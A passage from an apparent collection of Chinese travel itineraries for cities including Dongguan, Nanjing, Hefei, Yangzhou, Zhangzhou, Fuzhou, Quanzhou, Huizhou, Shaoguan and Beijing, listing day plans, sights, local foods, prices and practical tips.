旧厂房改造的潮玩地，看艺术展、淘手作，傍晚在「COMMUNE」点酒水小吃套餐（168元），赏江景夜景。 ​​宵夜彩蛋：新光明市场​​ 夜市开放至23:00，推荐：莞城油糍、鸡蛋仔、猪扒包，感受本地人夜生活。\n🍽️ ​​东莞必吃美食红黑榜​​（亲测小红书高赞！） ​​类型​​\t​​推荐店铺/菜品​​\t​​位置​​\t​​人均​​\t​​亮点​​ ​​烧腊​​\t莞城中山餐馆烧鹅濑粉\t莞城新风路\t20元\t皮脆肉嫩，汤汁浸透濑粉 ​​粥粉面​​\t李璋饮食店厕所粥\t却金亭碑旁巷内\t20元\t肉丸弹牙，加粉肠绝配 ​​客家菜​​\t亲戚屋企佛手大排骨\t万江下坝\t45元\t外酥里嫩，肉汁爆棚 ​​糖水​​\t矮房子甜品店榴莲忘返\t下坝坊\t25元\t榴莲果肉+椰奶冰沙 ​​小吃​​\t细村市场无名烫粉\t细村市场\t8元\t米皮绵柔，酱香浓郁 ​​避雷​​\t景区网红烤肠\t各景点\t10元\t淀粉感重，不如吃鸡蛋仔\n⚠️ ​​实用贴士​​ ​​交通避坑​​： 市区→寮步山姆打车约25元（20分钟）；回程可预约网约车，避免排队。 ​​美食动线优化​​： 细村市场早7点前到可避开人流；下坝坊傍晚灯光更有氛围。 ​​住宿推荐​​： 莞城「东莞康帝国际酒店」：高空泳池+步行到可园； 东城「猫的理想国」民宿：文艺loft，近商圈。\n南京 d2 ok ​行程总览​​ ​​主题​​：六朝古都·民国风情·秦淮烟火 ​​住宿建议​​：新街口（交通枢纽）或夫子庙（夜游方便） ​​交通方式​​：地铁+打车（景点密集，打车起步价11元）\n🌿 ​​Day 1：钟山怀古·民国风云​​ ​​上午：中山陵+音乐台​​ ​​08:30-11:00 中山陵​​（免费需预约） 登392级台阶俯瞰金陵城景，感受“天下为公”的庄严。 → 顺路打卡：梧桐大道，清晨光影绝美。 ​​11:00-12:00 音乐台​​（门票10元） 喂白鸽听喷泉，建议早到避开人流。\n​​午餐：南京大牌档（中山陵店）​​ 必点：​​美龄粥​​（豆浆山药粥）、​​烤鸭包​​、​​糖芋苗​​。​​\n下午：明孝陵+美龄宫​​ ​​13:30-15:00 明孝陵​​（门票70元） 走“南京最美600米”石象路，秋日银杏大道封神。 ​​15:30-17:00 美龄宫​​（门票30元） 空中俯瞰如“蓝宝石项链”，内部复刻民国生活场景。 ​​\n晚上：老门东逛吃​​ ​​18:30-21:00​​ 吃​​蒋有记牛肉锅贴​​（爆汁黄金月牙）、​​陆氏梅花糕​​（豆沙馅绵密），登明城墙赏夜景（免费段）。\n🛶 ​​Day 2：文博沉浸·秦淮夜韵​​ ​​\n上午：南京博物院+总统府​​ ​​09:00-11:30 南京博物院​​（免费需预约） 重点看历史馆金缕玉衣、民国馆复古街景，提前7天抢票！ ​​12:00-13:30 总统府​​（门票35元） 中西合璧建筑群，近代史缩影。\n​​午餐：科巷小吃扫街​​ ​​陶记正宗德州扒鸡​​的藕饼（5元/份）、​​草鸡蛋现做蛋糕​​。\n​​下午：山姆采购+鸡鸣寺​​ ​​15:00-17:00 南京山姆会员店（江北店）​​ ​​必买清单​​： 🛒 瑞士卷（68元/16块）、麻薯（39元/24个） 🛒 芝士牛肉卷（餐吧现做，20元/条） → Tips：某宝租次卡8元，避开周末高峰。 ​​17:30-18:30 鸡鸣寺​​（门票10元含香） 登药师佛塔看落日余晖洒满玄武湖，求姻缘香火旺。 ​\n​晚上：夫子庙夜泊秦淮​​ ​​19:30-21:00​​ 乘画舫夜游（💰100元），赏灯光桨影，吃​​莲湖糕团店​​赤豆元宵。\n🍜 ​​南京必吃美食地图​​ ​​类别​​\t​​推荐店铺/菜品​​\t​​位置​​\t​​亮点​​ ​​鸭子​​\t章云板鸭（盐水鸭前脯）\t评事街\t皮白肉嫩，咸香透骨 ​​锅贴​​\t李记清真馆（牛肉锅贴）\t打钉巷\t底部酥脆，爆汁预警 ​​汤面​​\t项记皮肚面+油渣\t明瓦廊\t猪皮吸饱红汤，碳水狂欢 ​​甜品​​\t蓝老大糖粥藕（糖芋苗）\t老门东\t桂花香+芋头绵软 ​​小吃​​\t芳婆糕团店（乌饭包油条）\t王府大街\t本地人早餐标配\n⚠️ ​​实用贴士​​ ​​预约指南​​： 中山陵、南京博物院、侵华日军纪念馆需提前1-7天预约（公众号或官网）。 总统府每日00:00放票，提前2天抢。 ​​交通避坑​​： 钟山景区内买观光车票（💰50元/日），节省体力。 山姆店距市中心约15km，建议打车（💰30元）或自驾。 ​​省钱技巧​​： 免费景点：玄武湖、老门东、鱼嘴湿地公园日落。\n合肥 d2 ​​行程总览​​ ​​主题​​：Day1 老城烟火·人文印记 | Day2 湖山双韵·古村寻幽 ​​住宿建议​​：淮河路步行街（近美食/夜景）或滨湖新区（近巢湖） ​​交通​​：地铁+打车（景点集中，打车起步价8元）\n🏮 ​​Day 1：老城脉络·市井味道​​ ​\n​上午：历史街巷漫游​​ ​​08:30-10:00 包公祠​​（门票20元） 瞻仰包拯塑像，走九狮桥听“廉泉”传说，感受宋代司法文化。 ​​10:30-12:00 淮河路步行街​​ 逛​​撮造山巷​​复古涂鸦墙，登​​古教弩台·明教寺​​（门票10元），三国曹操点将台遗址。\n​​午餐：老字号徽味​​ ​​12:30 庐州烤鸭店（总店）​​ 必点：​​鸭油烧饼​​（酥脆咸香）、​​赤豆糊​​（绵密微甜），人均25元。 ​\n​下午：文艺与博物之旅​​ ​​14:00-16:00 安徽省博物院​​（免费需预约） 重点看商周青铜器、徽州古建模型，2F文创店买徽派书签。 ​​16:30-18:00 合柴1972​​（免费） 监狱改造的艺术区，拍蒸汽小火车、复古家电墙，傍晚光影绝美。\n​​夜晚：夜市烟火气​​ ​​19:00 罍街夜市​​ 吃​​庄墓圆子​​（糯米肉丸）、​​刘鸿盛饺面​​（鸡汤馄饨配碱水面）。 ​​夜宿推荐​​：淮河路设计师民宿（如「庐州意库」文创社区）。\n🌊 ​​Day 2：湖光山色·古村秘境​​ ​​\n方案A：经典湖山线（人文+自然）​​ ​​09:00-12:00 三河古镇​​（免费，小景点联票50元） 乘摇橹船穿行青石巷，尝​​三河米饺​​（河虾馅）、​​糯米封鸭​​，登望月阁瞰水乡全景。 ​​14:00-16:00 紫蓬山国家森林公园​​（免费） 森林步道吸氧，访西庐寺，山顶眺望巢湖，6月紫薇花盛开。\n​​方案B：小众避暑线（避开人流）​​ ​​09:00-11:00 合肥滨湖国家森林公园​​（免费） 租自行车穿行水杉林（20元/小时），荷塘栈道赏六月新荷。 ​​13:00-15:00 长临河古镇​​（免费） 原生态渔村，做​​野菜粑粑​​、尝​​银鱼蒸蛋​​，红石咀公园拍“海边”礁石。 ​​共同晚餐：巢湖鲜味​​ ​​17:30 中庙土菜馆​​ 必点：​​杂鱼锅​​（小鲫鱼+黄鳝焖烧）、​​清蒸白丝鱼​​，人均60元。\n🍜 ​​合肥必吃美食地图​​ ​​类型​​\t​​推荐店铺/菜品​​\t​​位置​​\t​​亮点​​ ​​小吃​​\t庐州烤鸭店-鸭油烧饼\t淮河路步行街\t酥脆多层，鸭油焦香 ​​徽菜​​\t不倒翁徽菜楼-臭鳜鱼\t三孝口\t发酵适度，肉质蒜瓣状 ​​糕点​​\t陶永祥炒货-花生糖\t城隍庙\t古法熬糖，甜而不腻 ​​夜市​​\t罍街-庄墓圆子\t宁国南路\t糯米软糯，肉馅鲜咸\n🛏️ ​​住宿与贴士​​ ​​住宿推荐​​： ​​淮河路商圈​​：合肥君悦酒店（高空城景）、「庐州意库」文创民宿。 ​​滨湖新区​​：融创诺富特（近融创乐园，方便次日游玩）。 ​​交通指南​​： 市区→三河古镇打车约50元（30分钟），或乘旅游巴士（庐州大道站发车）。 地铁3号线直达合柴1972、省博物院。\n扬州 d2 ​行程总览​​ ​​主题​​：Day1 园林古巷·运河夜韵 | Day2 文博早茶·湖山雅韵 ​​住宿建议​​：东关街附近（夜游方便）或瘦西湖畔（清晨静谧） ​​交通方式​​：步行+共享电动车+打车（景点密集，打车起步价¥9）\n🏮 ​​Day 1：园林奇观·非遗夜游​​ ​\n​上午：盐商园林与古街烟火​​ ​​08:30-10:00 个园​​（¥45，学生半价） 中国四大名园之一，重点看​​四季假山​​：春山笋石如林、夏山湖石临池、秋山黄石磅礴、冬山宣石似雪。 ​​10:30-12:00 东关街​​（免费） 尝​​四喜汤圆​​（荠菜/豆沙/鲜肉/芝麻）、​​藕粉圆子​​（Q弹清甜），逛​​谢馥春香粉店​​体验古法香膏制作（¥30/次）。\n​​午餐：淮扬菜精髓​​ ​​12:30 卢绍绪盐商住宅（现淮扬菜博物馆）​​ 在盐商大宅吃​​狮子头炖盅​​（肉质松软）、​​文思豆腐羹​​（细如发丝），人均¥80。 ​\n​下午：文艺巷弄与运河明珠​​ ​​14:00-15:30 皮市街​​（免费） 打卡「浮生记书店」集章，喝「蘑菇堂」杨梅冰沙，拍“扬州慢”灯笼墙。 ​​16:00-18:00 中国大运河博物馆​​（免费需预约） 必看：1号厅5D运河沉浸体验、3号厅仿古街市穿汉服拍照、屋顶花园眺望三湾大桥。\n​​夜晚：非遗表演与古渡夜航​​ ​​19:30 东关古渡游船​​（¥100） 乘船赏运河灯光秀，听扬州清曲《茉莉花》，途经南门遗址光影壁画。 ​​宵夜：粗茶淡饭​​ 吃​​桂花藕粉圆​​（¥12/碗）、​​扬州炒饭​​（虾仁+火腿粒爆香）。\n🌿 ​​Day 2：早茶仪式·湖山诗画​​ ​\n​清晨：舌尖上的扬州​​ ​​07:00 趣园茶社​​（早茶排队王） 必点：​​蟹黄汤包​​（先吸汁后吃皮）、​​五丁包​​（海参/鸡肉/笋丁）、​​烫干丝​​（麻油香润）。\n​​上午：瘦西湖精华段​​ ​​08:30-11:00 瘦西湖​​（¥100，建议南门进） 经典路线：长堤春柳→徐园→​​五亭桥​​（莲花造型）→​​二十四桥​​（杜牧诗境）→​​白塔晴云​​。 → 秘境：​​小金山风亭​​俯瞰湖景，人少景美。\n​​午餐：大明寺素斋​​ ​​11:30 大明寺素食坊​​（¥50/人） 尝​​素蟹粉豆腐​​（胡萝卜+姜末仿蟹香）、​​罗汉炒饭​​（菌菇鲜香）。 ​​\n下午：双博沉浸与盐商传奇​​ ​​13:30-15:00 扬州双博馆​​（免费需预约） 雕版印刷体验（¥30拓印诗笺）、看镇馆之宝元霁蓝釉白龙梅瓶。 ​​15:30-17:00 天宁寺​​（免费） 康熙/乾隆南巡行宫，红墙拍照出片，寺内​​扬州非遗珍宝馆​​看漆器点螺工艺。\n🍜 ​​扬州必吃美食红黑榜​​ ​​类型​​\t​​推荐店铺/菜品​​\t​​位置​​\t​​人均​​\t​​亮点​​ ​​早茶​​\t趣园茶社-蟹黄汤包\t长春路\t¥80\t汤汁鲜美，皮薄如纸 ​​小吃​​\t粗茶淡饭-桂花藕粉圆\t东关街\t¥15\t藕粉软糯，桂花蜜清甜 ​​淮扬菜​​\t淮扬菜博物馆-文思豆腐\t卢绍绪盐商宅\t¥40\t刀工极致，羹汤醇厚 ​​避雷​​\t景区竹筒奶茶\t瘦西湖内\t¥28\t香精味重，性价比低\n⚠️ ​​实用贴士​​ ​​预约指南​​： 大运河博物馆提前7天公众号预约（0点放票），周一闭馆。 瘦西湖早7点前入园免门票（限本地居民，游客需购票）。 ​​交通避坑​​： 景点间建议共享电动车（¥2/10分钟），东关街-瘦西湖打车¥12。 游船选​​夜航东关古渡段​​（灯光更美），日航选​​北护城河​​（人少清幽）。 ​​夏季优化​​： 午后高温时段安排室内景点（双博馆/淮扬菜博物馆），备手持风扇+驱蚊液。 瘦西湖早茶后立即入园，避开9点后旅行团高峰。 ​​住宿推荐​​： ​​东关街​​：长乐客栈（明清宅院改造，夜游方便）。 ​​瘦西湖​​：迎宾馆（国宾馆级别，步行至趣园5分钟）。\n漳州 d1 ok 上午：文化探索之旅 文昌门：从这里开启古城探索之旅，文昌门始建于明朝，白天古朴典雅，夜晚亮灯后氛围感十足，是拍照打卡的好地方。 百货大楼 12 楼：乘坐电梯直达 12 楼，透过小窗户用长焦镜头可拍摄古城全景，高低起伏的屋顶、纵横交错的小巷尽收眼底。 中山公园：从东门踏入这座绿树成荫的公园，仿佛走进城市的天然氧吧，可在此放松身心，然后从南门走出。 天主教堂：步入教堂，感受宗教建筑带来的庄严肃穆氛围，独特的建筑风格和宁静的环境，让人不自觉地沉浸其中。\n中午：美食盛宴 青年路：这里是美食爱好者的天堂，汇聚了各式各样的漳州特色小吃，可以从街头吃到街尾。\n下午：历史文化漫步 香港路石牌坊：香港路上的四座明清石牌坊，雕刻工艺细腻精美，承载着漳州厚重的历史，站在牌坊下仿佛穿越回古代。 文庙：踏入文庙，浓厚的古代文化气息扑面而来，入口右边外墙上醒目的 “漳州” 二字，是必打卡的标志性元素，别忘了拍照留念。 东桥亭：这座古色古香的桥亭，是拍照的绝佳背景板，不管是拍风景还是拍人像，都能拍出极具古风韵味的大片。 延安南路：漫步在延安南路上，脚下的石板路和街边的老建筑，都在静静诉说着岁月的故事，可放慢脚步，沉浸式感受古城的独特韵味。 北京路：这里有浪漫至极的橙色玫瑰瀑布，还有特色十足的 “漳州日历墙”，街景充满江南水乡的温婉气息，随便一拍都是一幅美丽的画卷。\n晚上：夜景与休闲 欣赏古城夜景：夜幕降临后，红砖骑楼在灯光下更具韵味，文昌门的暖黄灯光也让其变身浪漫打卡地，可漫步古城，感受夜景的魅力。\n早餐 阿君豆花：位于青年路 199 号，特色咸豆花搭配粉丝，可选 31 种卤料，汤头鲜香。 瑞金锅边糊：在延安广场，米浆现烫成薄片，搭配卤大肠、油条，汤底用筒骨熬制，口感滑嫩。 阿琴牛肉：新华西路的这家店，沙茶面加入花生酱，汤底醇厚，推荐加牛肉丸、豆干。\n小吃 圆圈松跃生烫：性价比超高，任选 4 样只要 10 元，选 6 样也才 15 元，还有 3 元一份的拌面，营业到很晚，是夜宵的绝佳选择。 阿国三角棵粢饭糕：三角粿 4 个仅需 3 元，再搭配上炸里脊肉和芋头丸，一口下去，酥脆可口。 牛氏孔庙果汁：片仔癀、柠檬和甘蔗的奇妙组合，喝起来酸甜清爽，还带有淡淡的青草味，超级解腻。 清叶鸡蛋汉堡：普通的鸡蛋汉堡 4.5 元一个，加火腿的 5.5 元，多种口味可选，外皮酥脆，内馅丰富。 老康面煎粿：甜口的 3 元，咸口的 4 元。外皮酥脆，甜口味道浓郁但略有些腻，咸口则别有一番风味。\n午餐 / 晚餐 蚵仔煎：漳州特色米浆煎蚵仔，外酥里嫩，搭配酸萝卜和甜辣酱。 漳州卤面：卤汤浓稠，碱面劲道，必加五香卷、套肠。 阿羡下沙蒜蓉鸭：位于青年路，鸭肉甜咸交织，蒜香浓郁，适合下酒。\n购物推荐 片仔癀：漳州的特色中药，具有清热解毒、凉血化瘀等功效，可以购买一些作为伴手礼。 木版年画明信片：具有漳州特色的木版年画制作而成的明信片，色彩鲜艳，图案精美，可留作纪念或送给朋友。 八宝印泥：漳州的传统工艺品，具有色泽鲜艳、气味芬芳、永不褪色等特点，是书画爱好者的佳品。 麻糍：如孙氏麻糍，手工现包，花生芝麻馅香糯不腻，美味可口，但需当天食用。\n漳州 d2 ✅ Day 1：古韵与市井美食之旅 上午｜【南山寺 \u0026amp; 南山桥风光】 南山寺：始建于唐代，是漳州最有历史韵味的寺庙之一，香火旺盛，环境清幽。\n南山桥+九龙江景观道：走在桥上可以远眺九龙江两岸，拍照打卡很出片。\n📍推荐路线：南山寺 → 南山桥散步 → 漳州碧湖生态公园边走边拍\n中午｜【府埕口·闽南古早味】 推荐美食：\n沙茶面（阿强沙茶面）\n五香卷、卤面\n烧肉粽（推荐“阿辉烧肉粽”）\n位置：中山路、南昌路一带的小吃非常集中。\n下午｜【古城文化游：府埕古街 + 漳州文庙】 府埕古街：保留完整的闽南红砖古厝，适合拍照、喝咖啡、买伴手礼。\n漳州文庙：福建保存较完整的文庙之一，有浓厚的儒学气息。\n晚上｜【夜游碧湖 + 晚餐】 碧湖夜景：灯光下的碧湖十分迷人，湖边步道凉爽舒适。\n推荐晚餐：\n阿国海鲜大排档（新浦路附近）或\n西洋坪牛排/闽南热炒\nDay 2：生态与艺文慢生活之旅 上午｜【龙文湿地公园 or 云洞岩】 龙文湿地公园：适合拍照、晨跑，园内有水杉、鸟类栖息点，绿意盎然。\n云洞岩：轻松爬山，俯瞰漳州城区，山中庙宇古迹众多。\n📝备注：两个景点都在城区10公里以内，可任选其一安排。\n中午｜【大润发美食城 or 延安北路闽南餐厅】 经济实惠选择：大润发楼下的各种小吃摊\n推荐餐厅：漳州特色的“金汤酸菜鱼”、“扁食汤”、“蚝仔煎”\n下午｜【艺术与休闲：漳州博物馆 + 艺术馆】 漳州博物馆：了解漳州的历史、陶瓷文化\n漳州市美术馆 or 漳州图书馆新馆：现代化设计，有时会有展览\n晚上｜【尾声晚餐 + 夜市】 胜利东路夜市 or 新浦东市场夜市：探访当地人气夜市\n美食推荐：\n烧烤串串 四果汤 地瓜粥 芋泥鸭\n🎁 补充推荐（如时间宽裕）： 九龙公园：适合带小孩，园内有小动物区。\n漳州东南花都（迷你版）：市区花卉市场聚集地，适合买盆栽小花。\n漳州市区 ​​d1 ​​上午：漳州古城（芗城区）​​\n​​特色​​：明清古街、牌坊群（尚书探花坊）、非遗展示馆、文庙。 ​​美食推荐​​：老国三角粿、阿芳卤面、孔庙果汁（片仔癀+甘蔗汁）。 ​​Tips​​：清晨或傍晚游览更舒适，避开正午烈日。 ​​中午：古城附近午餐​​\n​​推荐​​：尝试锅边糊、蚵仔煎、沙茶面，店铺推荐“鲁面海”或“阿琴牛肉”。 ​​下午：南山寺 \u0026amp; 中山公园​​\n​​南山寺​​：唐代古寺，环境清幽，大雄宝殿香火旺盛。 ​​中山公园​​：百年公园，适合散步，内有孙中山纪念堂。 ​​交通​​：步行或共享单车可达，两景点相距约2公里。 ​​傍晚：江滨公园看日落​​\n​​亮点​​：九龙江畔夕阳，夜景灯光开启后很美。 ​​晚上：夜市觅食​​\n​​钟法路/新华西路夜市​​：四果汤、烧肉粽、盐鸡胎、手抓面。\n汕尾 d2 第一天：城市文化与海滨风光 主题：历史人文 + 海滨休闲\n上午：海陆丰革命纪念馆 \u0026amp; 凤山古庙 海陆丰革命纪念馆\n了解中国近代革命历史，尤其是海陆丰农民运动的光辉历程。 地址：汕尾市城区红海中路 建议时间：1.5小时 门票：免费（部分展区可能需预约） 凤山古庙\n汕尾的地标性建筑，供奉“天后圣母”妈祖，建筑风格独特，可俯瞰汕尾港。 地址：汕尾市城区凤山街道 建议时间：1小时 门票：约10元 午餐推荐：\n汕尾鱼丸：本地特色，鲜嫩弹牙，推荐“汕尾鱼丸老店”或市区小吃街。 菜粿：潮汕风味，米浆蒸制，配酱料食用。 下午：红海湾（看日落） 红海湾 汕尾最著名的海滨景区，沙滩细腻，海水清澈，适合散步、拍照。 建议活动：沿海岸线骑行或漫步，傍晚欣赏日落。 地址：汕尾市城区红海湾经济开发试验区 门票：免费（部分景区可能收费） 晚餐推荐：\n海鲜大排档：红海湾附近有许多海鲜餐厅，推荐清蒸鲈鱼、膏蟹、虾蛄等。 推荐餐厅：红海湾海鲜广场（需提前预订） 住宿建议： 汕尾市区酒店：如“汕尾香江酒店”或“碧桂园凤凰酒店”，方便次日出行。\n第二天：自然风光与渔村体验 主题：滨海自驾 + 渔村风情\n上午：鲘门镇 \u0026amp; 遮浪半岛 鲘门镇\n汕尾的“小三亚”，拥有金色沙滩和清澈海水，适合游泳、玩水。 建议活动：沙滩漫步、体验水上项目（如摩托艇、帆船）。 地址：汕尾市陆河县鲘门镇 遮浪半岛\n中国唯一“海陆交界”的半岛，东临南海，西接陆地，景色壮丽。 建议活动：登顶观景台俯瞰海陆全景，拍摄“一半海水、一半陆地”大片。 地址：汕尾市城区遮浪街道 门票：约30元 午餐推荐：\n鲘门渔村简餐：尝试新鲜的渔村特色菜，如酱焗龙虾、海胆炒饭。 下午：马宫渔港 \u0026amp; 玄武山旅游区 马宫渔港\n汕尾最大的渔港，可近距离感受渔民生活，购买新鲜海鲜。 建议活动：逛渔港市场，品尝现捞海鲜。 玄武山旅游区\n佛教圣地，有千年古刹“元山寺”，山林幽静，适合静心祈福。 地址：汕尾市陆丰市玄武山 门票：约50元\n返程建议： 若时间充裕，可顺路前往陆河县，体验客家人文化或品尝“陆河三宝”（荔枝、青梅、竹笋）。\n惠州 d2 滨海风情+古村探秘游 Day1：双月湾深度游 海龟湾保护区\n亚洲唯一海龟产卵地，漫步礁石栈道观海 双月湾观景台\n俯瞰大亚湾与红海湾交汇奇观 美食推荐\n午餐：海边春餐厅（椒盐鱼） 晚餐：华家班特技表演+海鲜烧烤 夜宿推荐\n日出· （悬崖海景房） Day2：古村与生态体验 范和古村\n700年历史渔村，保留罗冈围古建筑群 红树林湿地公园\n观候鸟、探秘湿地生态系统 特色活动\n东升渔村体验渔家民俗，尝试渔家炸鳗鱼 福州 d2 住宿推荐区域：东街口、三坊七巷、中亭街附近，交通便利，核心景点集中\n第一天：文化与城市风情之旅 上午：三坊七巷 + 文庙 + 补光巷 三坊七巷（免费）\n福州的名片，有“里坊制度活化石”之称\n推荐巷子：南后街（主街）、杨桥巷、郎官巷、文儒坊\n推荐打卡点：林则徐纪念馆、严复故居、冰心纪念馆（部分需门票）\n文庙\n福州的孔庙，位于三坊七巷旁，安静古朴\n补光巷涂鸦墙\n文艺打卡地，小众但拍照很好看\n午餐（三坊七巷周边）： 永和鱼丸：福州传统鱼丸\n爱荔枝的猫：文艺风下午茶\n瓦罐煨汤/佛跳墙套餐：试试地道闽菜\n下午：西湖公园 + 左海公园（连通，免费） 福州城市中的天然氧吧，超大生态湖\n推荐体验：划船、拍照、散步\n可在公园内走走喝喝：左海有个儿童游乐场、湖边咖啡店\n晚餐推荐（西湖/东街口周边）： 达道牛肉：地道清汤牛肉火锅\n黄记煌三汁焖锅\n华榕酒店自助餐（高性价比）\n晚上可选活动： 东街口逛夜市、买手店/文创店（诚品书店推荐）\n南后街夜游灯光很美\n第二天：人文宗教 + 市井生活体验 上午：福建博物院 + 鼓山脚下闲逛 福建博物院（免费）\n了解闽地文化、民族风情，有丰富展览\n温泉公园/福州图书馆（可选）\n喜欢静静坐着的人可来这边泡泡脚、看书\n⚠️ 鼓山风景区虽有名，但山上距离市区较远（约12公里），若不打算上山可选择留在脚下的寺庙或去别的公园\n午餐（五一路附近）： 太极芋泥：福州特色甜品\n同利肉燕老铺：百年老字号\n牛肉粉干：地道小吃\n下午：上下杭历史街区 + 中洲岛（傍晚拍照超美） 上下杭历史街区\n近年翻新后文艺气息浓厚，有很多老建筑改造成咖啡厅/书店/设计店\n中洲岛\n网红拍照地，日落非常漂亮，可看到闽江夜景\n晚餐推荐（上下杭周边）： 阿嬷饭店：融合福州菜+文艺装潢 墨鱼煲：特色小海鲜 老字号锅边糊/线面糊/芋泥等小吃\n泉州 d2 📅 第一天：古城文化游 上午：泉州古城核心 开元寺（必去）\n免费开放，闽南第一大寺，中国东西方宗教融合的代表。\n看东西塔、拜月老、看千年古桑。\n东西街\n泉州最有生活气息的老街区，古建筑+小吃+文创。\n推荐尝试：满煎糕、四果汤、牛排骨酥、五香卷。\n中午：市井小吃 or 文艺餐厅 推荐店：\n西街米粉线：地道闽南小吃。\n拾味馆：适合拍照，有融合菜式。\n下午：宗教多元文化游 清净寺：中国现存最早的伊斯兰教寺，外观像阿拉伯清真寺。\n天后宫/妈祖庙：感受妈祖信仰文化。\n关岳庙：供奉关公和岳飞，泉州人心中最重要的庙宇之一。\n通淮关岳庙到泉州天后宫一带 都在步行距离内。\n晚上：中山路夜游 + 美食 沿中山南路步行，体验古城夜色和小吃。\n推荐小吃：\n炸五香、润饼、烧肉粽、蚵仔煎、炸枣。\n可以去阿利虾棘或吴记烧肉粽。\n第二天：博物馆 + 生活感游览 上午：泉州博物馆 or 海交馆 泉州海外交通史博物馆（强烈推荐）\n讲述泉州海上丝绸之路的辉煌，门票免费。\n泉州影雕馆/南音艺苑（可选）\n了解泉州非遗艺术（南音、影雕、提线木偶）\n中午：西湖公园周边或刺桐路美食 泉州西湖公园（适合午后小憩）\n免费开放，湖光山色，市民常来放风筝、散步。\n餐厅推荐：\n顺德人家：粤菜+本地菜\n南益美食城：本地连锁，美食多样\n下午：文创/市井体验 泉州府文庙：感受古代书院文化。\n泉州南门书社/文创街区：文艺青年打卡地。\n骑行环城路线（可选）：西街 → 江滨北路 → 东湖 → 少林寺外观\n晚上：东湖夜景 or 泉州湾夜游（视体力选择） 东湖公园夜景不错。\n或打车前往【泉州湾大桥观景台】，看看海边夜景（距离约9-10km）\n住宿推荐：选择【鲤城区】、【泉州古城】周边，便于出行和夜游。 【开元寺附近】或【西街/中山南路周边】\n惠州 d2 📍 Day 1 行程：西湖风光 \u0026amp; 市区文化 上午：惠州西湖一日游（徒步+船游） 必看景点：\n平湖秋月 泉庄 苏堤 飞虹桥\n玩法建议：\n徒步环湖 + 坐船游湖 拍照打卡，慢节奏享受风景\n📸 推荐打卡点：泗洲塔远景、湖心岛、情侣桥\n中午：西湖边美食 推荐餐厅：\n阿里山台湾风味餐厅（风景+味道兼具）\n老街小吃（酿豆腐、猪肠碌、糍粑）\n下午：丰渚园 + 惠州博物馆 丰渚园：免费园林景点，古典岭南建筑，文化味浓\n惠州博物馆（江北）：空调+文艺+避暑 常设展 + 临时展，很适合亲子或情侣逛逛\n晚上：逛江北万达 or 西湖夜景 江北万达、佳兆业广场：购物、美食\n如果喜欢文艺夜游，可以继续沿西湖夜游，灯光很美\nDay 2 行程：红花湖+休闲逛街 上午：红花湖绿道骑行 or 徒步 自然氧吧，超适合晨间活动\n可租单车环湖骑行（全程约19公里，推荐骑半圈）\n不骑车的话，也可以只走部分步道，体验森林感\n中午：江南味道 or 小馆子 推荐：\n江南汇（江北店）：中餐清淡精致\n客家小厨：体验地道客家风味\n下午：文艺街区 or 咖啡店闲逛 推荐地点：\n麦地文艺街区：手作、书店、小众咖啡馆\n惠州图书馆：新馆设计感强，适合阅读和放松\n推荐住宿（中心便利、交通方便） 建议住在 惠州西湖景区附近 或 江北 CBD 区域\n西湖附近民宿（景观优美，出门就是风景）\n韶关 d2 第一天：老城文化打卡日 上午｜风采楼 + 东街步行街\n风采楼：韶关地标性古塔，感受城市历史。\n东街步行街：老城区商业街，适合闲逛和拍照。\n📍 建议时间：9:00 - 11:30 🚶 交通：位于市中心，可步行或骑行前往\n中午｜风采小吃城美食打卡\n推荐：\n韶关牛肉丸 叉烧肠粉 云吞面\n📍 地点：风采小吃城（或周边美食街）\n下午｜中山公园 + 韶关博物馆\n中山公园：湖边散步、树荫乘凉、市民日常休闲地。\n韶关博物馆：了解本地历史文化和丹霞风貌，免费开放。\n📍 时间：14:00 - 17:00 🚲 步行/骑行可达，均在市区范围内\n晚上｜江滨夜景 + 南枫夜市\n江滨公园：夜景灯光很美，沿江散步解压。\n南枫夜市：人气夜市，各种地道小吃：牛杂、炸鲜奶、章鱼小丸子、糯米糍。\n📍 时间：18:00 - 21:00 📌 建议早点去，避开人流高峰\n第二天：自然与文艺慢生活 上午｜风度书房 + 北江骑行绿道\n风度书房（韶州公园店）：安静阅读、文艺空间、适合拍照。\n北江绿道：租共享单车沿江骑行，适合放松身心。\n📍 时间：9:00 - 11:30 🚴 路线舒适，适合轻骑行\n中午｜本地茶楼早茶体验\n推荐：\n陶陶居茶楼（市区店）\n虾饺皇、流沙包、凤爪、烧卖、粥品\n📍 午餐后可小憩或在商圈逛逛\n下午｜丹霞书院 or 莲花山公园\n丹霞书院：喝茶看书静心体验，建筑设计古雅。\n莲花山公园：市区轻度爬山，山顶可俯瞰韶关全景。\n📍 时间：14:00 - 17:00 🚶 均在10公里以内，交通方便\n晚上｜自由活动 + 宵夜推荐\n推荐去处：\n二次逛南枫夜市或附近宵夜店\n美食如：沙锅粥、韶关米粉、牛杂煲\n✅ 小贴士 出行建议：步行 + 共享单车 + 打车最方便\n建议穿运动鞋，注意日晒和早晚温差\n韶关博物馆、书房部分场所周一闭馆，建议避开\n建议下载地图 App 标注上上述地标，便于游览\n北京 d3 ✅ 第一天：历史京韵与皇家文化 上午：天安门广场 \u0026amp; 故宫\n🔹 天安门广场（免费）：建议早上7:00看升旗仪式（需早起）。\n🔹 故宫（需预约）：建议8:30入园，从午门进，神武门出，游览约3小时。\n中午：东来顺（王府井店）\n特色：老北京涮羊肉、炸酱面。\n下午：景山公园 \u0026amp; 北海公园\n🔹 景山（故宫北门对面）：登高俯瞰紫禁城全景。\n🔹 北海公园：皇家园林，夏天可划船。\n晚上：什刹海 \u0026amp; 烟袋斜街\n逛胡同、感受老北京夜生活。\n可选乘坐三轮车游胡同。\n✅ 第二天：古今交融 \u0026amp; 网红地标 上午：天坛公园\n看祈年殿，感受皇家祭天文化。\n中午：便宜坊烤鸭（珠市口店）\n与全聚德齐名，主打果木烤鸭。\n下午：国子监 \u0026amp; 孔庙 + 南锣鼓巷\n国子监、孔庙：中国古代最高学府。\n南锣鼓巷：网红胡同，买文创、小吃多。\n晚上：王府井大街 \u0026amp; 小吃街\n王府井书店、百货、东华门夜市（特色小吃：糖葫芦、炸昆虫串）。\n✅ 第三天：登高远眺 \u0026amp; 文艺气息 上午：颐和园\n万寿山、昆明湖，乘船、登山，赏皇家园林。\n建议乘地铁4号线直达北宫门站。\n中午：颐和园周边农家乐或稻香村熟食\n下午：798艺术区\n现代艺术区、文艺青年聚集地。\n各类展馆、咖啡店、文创产品丰富。\n晚上可选：鸟巢水立方夜景 or 回民小吃街（牛街）\n牛街：老北京清真美食，爆肚冯、牛街礼拜寺附近有多家老字号。\n📍 地图范围确认 （参考距离）： 景点\t距市中心（天安门）距离 